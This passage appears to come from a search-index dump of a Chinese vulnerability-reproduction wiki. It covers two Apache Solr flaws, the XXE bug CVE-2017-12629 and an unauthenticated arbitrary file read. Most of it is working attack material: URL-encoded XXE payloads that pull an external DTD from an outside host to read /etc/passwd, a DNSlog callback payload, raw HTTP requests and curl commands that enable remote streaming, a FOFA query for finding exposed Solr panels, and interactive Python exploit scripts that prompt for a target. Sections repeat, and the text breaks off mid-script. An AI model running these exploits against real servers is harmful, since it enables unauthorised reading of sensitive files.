\u7136\u540e\u8bf7\u6c42\u8fd9\u4e2a\u6587\u4ef6\u6765\u8bfb\u53d6\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6 http://xxx.xxx.xxx.xxx:8983/solr/demo/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser [!NOTE] \u6ce8\u610f\u8fd9\u91cc\u7684payload\u8fdb\u884c\u4e86url\u7f16\u7801,\u8bf7\u6c42\u7684\u6587\u4ef6\u4e3a http://peiqi.tech/1.dtd \uff0c\u6709\u66f4\u591a\u9700\u6c42\u81ea\u884c\u66f4\u6539\u5199\u5165\u7684xml\u6587\u4ef6 \u6f0f\u6d1e\u5229\u7528POC \u00b6 #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Solr < 7.1 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 cve-2017-12629-xxe.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033 [0m' ) print ( '+ \\033 [36mcmd >>> dnslog\u5730\u5740(\u6f0f\u6d1e\u5916\u8fde\u68c0\u6d4b) \\033 [0m' ) print ( '+ \\033 [36mCmd >>> xxe_file(\u8bfb\u53d6/etc/passwd) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try : response = requests . request ( \"GET\" , url = core_url , timeout = 10 ) core_name = list ( json . loads ( response . text )[ \"status\" ])[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u5f97core_name,Url\u4e3a\uff1a\" + target_url + \"/solr/\" + core_name + \"/config \\033 [0m\" ) return core_name except : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , core_name , dnslog_url ): dns_payload = \"\"\" /solr/ %s /select?q={!xmlparser v='<!DOCTYPE a SYSTEM \" %s \"><a></a>'}&wt=xml \"\"\" % ( core_name , dnslog_url ) vuln_url = target_url + dnslog_url headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try : response = requests . request ( \"GET\" , url = vuln_url , headers = headers , timeout = 30 ) if \"HTTP ERROR 500\" in response . text : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) else : print ( \" \\033 [32m[o] \u8bf7\u67e5\u770bdnslog\u54cd\u5e94 \\033 [0m\" ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) def POC_3 ( target_url , core_name ): file_payload = \"\"\"/solr/ {} /select?&q=%3C %3f xml+version %3d%221.0% 22+ %3f%3E %3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http %3a%2f%2f peiqi.tech %2f 1.dtd %22% 3E %25e xt%3b %25e nt%3b %5d%3E %3Cr %3E%26d ata%3b%3C %2f r %3E &wt=xml&defType=xmlparser\"\"\" . format ( core_name ) vuln_url = target_url + file_payload headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests . request ( \"GET\" , url = vuln_url , headers = headers , timeout = 30 ) if \"/usr/sbin\" in response . text : print ( \" \\033 [32m[o] \u6f0f\u6d1e\u6210\u529f\u5229\u7528,\u54cd\u5e94\u4e3a \\n \\033 [0m\" , response . text ) else : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) core_name = POC_1 ( target_url ) while True : n = random . randint ( 1 , 9999 ) cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : exit ( 0 ) elif cmd == \"dnslog\" : dnslog_url = str ( input ( ' \\033 [35m\u8bf7\u8f93\u5165\u4f60\u7684dnslog\u5730\u5740\uff1a \\033 [0m' )) POC_2 ( target_url , core_name , dnslog_url , n ) elif cmd == \"xxe_file\" : POC_3 ( target_url , core_name )","title":"Apache Solr XXE \u6f0f\u6d1e CVE-2017-12629"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20XXE%20%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#apache-solr-xxe-\u6f0f\u6d1e-cve-2017-12629","text":"","title":"Apache Solr XXE \u6f0f\u6d1e CVE-2017-12629"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20XXE%20%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Apache Solr \u662f\u4e00\u4e2a\u5f00\u6e90\u7684\u641c\u7d22\u670d\u52a1\u5668\u3002Solr \u4f7f\u7528 Java \u8bed\u8a00\u5f00\u53d1\uff0c\u4e3b\u8981\u57fa\u4e8e HTTP \u548c Apache Lucene \u5b9e\u73b0\u3002\u539f\u7406\u5927\u81f4\u662f\u6587\u6863\u901a\u8fc7Http\u5229\u7528XML\u52a0\u5230\u4e00\u4e2a\u641c\u7d22\u96c6\u5408\u4e2d\u3002\u67e5\u8be2\u8be5\u96c6\u5408\u4e5f\u662f\u901a\u8fc7 http\u6536\u5230\u4e00\u4e2aXML/JSON\u54cd\u5e94\u6765\u5b9e\u73b0\u3002\u6b64\u6b217.1.0\u4e4b\u524d\u7248\u672c\u603b\u5171\u7206\u51fa\u4e24\u4e2a\u6f0f\u6d1e\uff1aXML\u5b9e\u4f53\u6269\u5c55\u6f0f\u6d1e\uff08XXE\uff09\u548c\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff08RCE\uff09\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20XXE%20%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#\u5f71\u54cd\u7248\u672c","text":"Apache Solr < 7.1 Apache Lucene < 7.","title":"\u5f71\u54cd\u7248\u672c"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20XXE%20%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#\u73af\u5883\u642d\u5efa","text":"https://github.com/vulhub/vulhub.git cd vulhub/solr/CVE-2017-12629-XXE docker-compose build docker-compose up -d","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20XXE%20%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#\u6f0f\u6d1e\u590d\u73b0","text":"","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20XXE%20%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#dnslog","text":"\u5148\u8bf7\u6c42url\u5730\u5740\u83b7\u53d6 core \u5185\u5bb9 http://xxx.xxx.xxx.xxx:8983/solr/admin/cores \u8bbf\u95ee http://xxx.xxx.xxx.xxx:8983/solr/demo/select?q={!xmlparser v='<!DOCTYPE a SYSTEM \"http://xxxxx.ceye.io\"><a></a>'}&wt=xml \u67e5\u770bdnslog\u5f97\u5230\u8bf7\u6c42","title":"Dnslog"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20XXE%20%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#\u8fdc\u7a0b\u8bfb\u53d6\u6587\u4ef6","text":"\u5728\u81ea\u5df1\u7684\u670d\u52a1\u5668\u4e0a\u5199\u5165\u4e00\u4e2a\u53ef\u8bbf\u95ee\u7684XML\u6587\u4ef6\uff0c\u5185\u5bb9\u5199\u5165 <!ENTITY % file SYSTEM \"file:///etc/passwd\"> <!ENTITY % ent \"<!ENTITY data SYSTEM ':%file;'> \"> \u7136\u540e\u8bf7\u6c42\u8fd9\u4e2a\u6587\u4ef6\u6765\u8bfb\u53d6\u670d\u52a1\u5668\u4e0a\u7684\u6587\u4ef6 http://xxx.xxx.xxx.xxx:8983/solr/demo/select?&q=%3C%3fxml+version%3d%221.0%22+%3f%3E%3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http%3a%2f%2fpeiqi.tech%2f1.dtd%22%3E%25ext%3b%25ent%3b%5d%3E%3Cr%3E%26data%3b%3C%2fr%3E&wt=xml&defType=xmlparser [!NOTE] \u6ce8\u610f\u8fd9\u91cc\u7684payload\u8fdb\u884c\u4e86url\u7f16\u7801,\u8bf7\u6c42\u7684\u6587\u4ef6\u4e3a http://peiqi.tech/1.dtd \uff0c\u6709\u66f4\u591a\u9700\u6c42\u81ea\u884c\u66f4\u6539\u5199\u5165\u7684xml\u6587\u4ef6","title":"\u8fdc\u7a0b\u8bfb\u53d6\u6587\u4ef6"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20XXE%20%E6%BC%8F%E6%B4%9E%20CVE-2017-12629/#\u6f0f\u6d1e\u5229\u7528poc","text":"#!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import sys import json import random def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Solr < 7.1 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 cve-2017-12629-xxe.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033 [0m' ) print ( '+ \\033 [36mcmd >>> dnslog\u5730\u5740(\u6f0f\u6d1e\u5916\u8fde\u68c0\u6d4b) \\033 [0m' ) print ( '+ \\033 [36mCmd >>> xxe_file(\u8bfb\u53d6/etc/passwd) \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try : response = requests . request ( \"GET\" , url = core_url , timeout = 10 ) core_name = list ( json . loads ( response . text )[ \"status\" ])[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u5f97core_name,Url\u4e3a\uff1a\" + target_url + \"/solr/\" + core_name + \"/config \\033 [0m\" ) return core_name except : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , core_name , dnslog_url ): dns_payload = \"\"\" /solr/ %s /select?q={!xmlparser v='<!DOCTYPE a SYSTEM \" %s \"><a></a>'}&wt=xml \"\"\" % ( core_name , dnslog_url ) vuln_url = target_url + dnslog_url headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } try : response = requests . request ( \"GET\" , url = vuln_url , headers = headers , timeout = 30 ) if \"HTTP ERROR 500\" in response . text : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) else : print ( \" \\033 [32m[o] \u8bf7\u67e5\u770bdnslog\u54cd\u5e94 \\033 [0m\" ) except : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) def POC_3 ( target_url , core_name ): file_payload = \"\"\"/solr/ {} /select?&q=%3C %3f xml+version %3d%221.0% 22+ %3f%3E %3C!DOCTYPE+root%5b%3C!ENTITY+%25+ext+SYSTEM+%22http %3a%2f%2f peiqi.tech %2f 1.dtd %22% 3E %25e xt%3b %25e nt%3b %5d%3E %3Cr %3E%26d ata%3b%3C %2f r %3E &wt=xml&defType=xmlparser\"\"\" . format ( core_name ) vuln_url = target_url + file_payload headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" } response = requests . request ( \"GET\" , url = vuln_url , headers = headers , timeout = 30 ) if \"/usr/sbin\" in response . text : print ( \" \\033 [32m[o] \u6f0f\u6d1e\u6210\u529f\u5229\u7528,\u54cd\u5e94\u4e3a \\n \\033 [0m\" , response . text ) else : print ( \" \\033 [31m[x] \u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) core_name = POC_1 ( target_url ) while True : n = random . randint ( 1 , 9999 ) cmd = input ( \" \\033 [35mCmd >>> \\033 [0m\" ) if cmd == \"exit\" : exit ( 0 ) elif cmd == \"dnslog\" : dnslog_url = str ( input ( ' \\033 [35m\u8bf7\u8f93\u5165\u4f60\u7684dnslog\u5730\u5740\uff1a \\033 [0m' )) POC_2 ( target_url , core_name , dnslog_url , n ) elif cmd == \"xxe_file\" : POC_3 ( target_url , core_name )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","text":"Apache Solr \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 Apache Solr \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u83b7\u53d6\u76ee\u6807\u670d\u52a1\u5668\u654f\u611f\u6587\u4ef6 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] Apache Solr <= 8.8.1 FOFA \u00b6 [!NOTE] title=\"Solr Admin\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee Solr Admin \u7ba1\u7406\u5458\u9875\u9762 \u83b7\u53d6core\u7684\u4fe1\u606f http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&wt=json \u53d1\u9001\u8bf7\u6c42 \u8bf7\u6c42\u5305\u5982\u4e0b POST /solr/ckan/config HTTP/1.1 Host: xxx.xxx.xxx:8983 Content-Length: 99 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://118.31.46.134:8983 Content-Type: application/json User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://118.31.46.134:8983/solr/ckan/config Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close {\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true},\"olrkzv64tv\":\"=\"} \u518d\u8fdb\u884c\u6587\u4ef6\u8bfb\u53d6 \u8bf7\u6c42\u5305\u5982\u4e0b POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Content-Length: 29 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Origin: http://118.31.46.134:8983 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://118.31.46.134:8983/solr/ckan/config Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close stream.url=file:///etc/passwd Curl\u8bf7\u6c42\u4e3a curl -d '{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' http://xxx.xxx.xxx.xxx:8983/solr/ { corename } /config -H 'Content-type:application/json' curl \"http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams\" -F \"stream.url=file://etc/passwd\" \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] POC\u8fd8\u662f\u5efa\u7acb\u5728\u672a\u6388\u6743\u8bbf\u95ee\u7684\u60c5\u51b5\u4e0b import requests import sys import random import re import base64 import time from lxml import etree import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Solr < 8.2.0 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033 [0m' ) print ( '+ \\033 [36mFile >>> \u6587\u4ef6\u540d\u79f0\u6216\u76ee\u5f55 \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try : response = requests . request ( \"GET\" , url = core_url , timeout = 10 ) core_name = list ( json . loads ( response . text )[ \"status\" ])[ 0 ] print ( \" \\033 [32m[o] \u6210\u529f\u83b7\u5f97core_name,Url\u4e3a\uff1a\" + target_url + \"/solr/\" + core_name + \"/config \\033 [0m\" ) return core_name except : print ( \" \\033 [31m[x] \u76ee\u6807Url\u6f0f\u6d1e\u5229\u7528\u5931\u8d25 \\033 [0m\" ) sys . exit ( 0 ) def POC_2 ( target_url , core_name ): vuln_url = target_url + \"/solr/\" + core_name + \"/config\" headers = { \"Content-type\" : \"application/json\" } data = '{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) print ( \" \\033 [36m[o] \u6b63\u5728\u51c6\u5907\u6587\u4ef6\u8bfb\u53d6...... \\033 [0m\" . format ( target_url )) if \"This\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u53ef\u80fd\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) def POC_3 ( target_url , core_name , File_name ): vuln_url = target_url + \"/solr/ {} /debug/dump?param=ContentStreams\" . format ( core_name ) headers = { \"Content-Type\" : \"application/x-www-form-urlencoded\" } data = 'stream.url=file:// {} ' . format ( File_name ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) if \"No such file or directory\" in response . text : print ( \" \\033 [31m[x] \u8bfb\u53d6 {} \u5931\u8d25 \\033 [0m\" . format ( File_name )) else : print ( \" \\033 [36m[o] \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( json . loads ( response . text )[ \"streams\" ][ 0 ][ \"stream\" ])) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) core_name = POC_1 ( target_url ) POC_2 ( target_url , core_name ) while True : File_name = str ( input ( \" \\033 [35mFile >>> \\033 [0m\" )) POC_3 ( target_url , core_name , File_name ) Goby & POC \u00b6 \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Apache_Solr_Arbitrary_File_Read.json \u53c2\u8003\u6587\u7ae0 \u00b6 https://mp.weixin.qq.com/s/HMtAz6_unM1PrjfAzfwCUQ","title":"Apache Solr \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#apache-solr-\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e","text":"","title":"Apache Solr \u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"Apache Solr \u5b58\u5728\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\u83b7\u53d6\u76ee\u6807\u670d\u52a1\u5668\u654f\u611f\u6587\u4ef6","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] Apache Solr <= 8.8.1","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] title=\"Solr Admin\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee Solr Admin \u7ba1\u7406\u5458\u9875\u9762 \u83b7\u53d6core\u7684\u4fe1\u606f http://xxx.xxx.xxx.xxx/solr/admin/cores?indexInfo=false&wt=json \u53d1\u9001\u8bf7\u6c42 \u8bf7\u6c42\u5305\u5982\u4e0b POST /solr/ckan/config HTTP/1.1 Host: xxx.xxx.xxx:8983 Content-Length: 99 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://118.31.46.134:8983 Content-Type: application/json User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://118.31.46.134:8983/solr/ckan/config Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close {\"set-property\":{\"requestDispatcher.requestParsers.enableRemoteStreaming\":true},\"olrkzv64tv\":\"=\"} \u518d\u8fdb\u884c\u6587\u4ef6\u8bfb\u53d6 \u8bf7\u6c42\u5305\u5982\u4e0b POST /solr/ckan/debug/dump?param=ContentStreams HTTP/1.1 Host: xxx.xxx.xxx.xxx:8983 Content-Length: 29 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36 Origin: http://118.31.46.134:8983 Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://118.31.46.134:8983/solr/ckan/config Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Connection: close stream.url=file:///etc/passwd Curl\u8bf7\u6c42\u4e3a curl -d '{\"set-property\" : {\"requestDispatcher.requestParsers.enableRemoteStreaming\":true}}' http://xxx.xxx.xxx.xxx:8983/solr/ { corename } /config -H 'Content-type:application/json' curl \"http://xxx.xxx.xxx.xxx:8983/solr/db/debug/dump?param=ContentStreams\" -F \"stream.url=file://etc/passwd\"","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%BC%8F%E6%B4%9E/Apache/Apache%20Solr/Apache%20Solr%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] POC\u8fd8\u662f\u5efa\u7acb\u5728\u672a\u6388\u6743\u8bbf\u95ee\u7684\u60c5\u51b5\u4e0b import requests import sys import random import re import base64 import time from lxml import etree import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: Apache Solr < 8.2.0 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx:8983 \\033 [0m' ) print ( '+ \\033 [36mFile >>> \u6587\u4ef6\u540d\u79f0\u6216\u76ee\u5f55 \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): core_url = target_url + \"/solr/admin/cores?indexInfo=false&wt=json\" try : response = requests . request ( \"GET\" , url = core_url , timeout = 10 ) core_name = list ( json . loads ( response . text )[ \"status\" ])[ 0 ] print ( \" \\033 [32m[o] 